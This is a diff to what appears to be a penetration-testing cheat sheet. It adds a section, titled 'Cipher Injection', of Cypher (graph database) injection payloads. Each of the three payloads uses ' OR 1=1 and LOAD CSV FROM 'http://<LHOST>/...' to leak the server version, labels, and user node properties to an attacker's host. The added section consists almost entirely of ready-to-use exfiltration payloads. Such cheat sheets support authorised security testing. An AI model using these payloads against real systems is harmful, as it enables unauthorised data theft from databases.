@@ -677,6 +677,30 @@ SELECT file_priv FROM mysql.user WHERE user = 'netspi'
 SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%netspi%'
 ```
 
+### Cipher Injection
+
+#### Check Server Version
+
+```c
+' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions
+as version LOAD CSV FROM 'http://<LHOST>/?version=' + version + '&name=' + name + '&edition=' + edition as
+l RETURN 0 as _0 //
+```
+
+#### Get Label
+
+```c
+' OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://<LHOST>/?label='+label as
+l RETURN 0 as _0 //
+```
+
+#### Get Key Properties
+
+```c
+' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://<LHOST>/?' + p
++'='+toString(f[p]) as l RETURN 0 as _0 //
+```
+
 ## sqlite3
 
 ```c
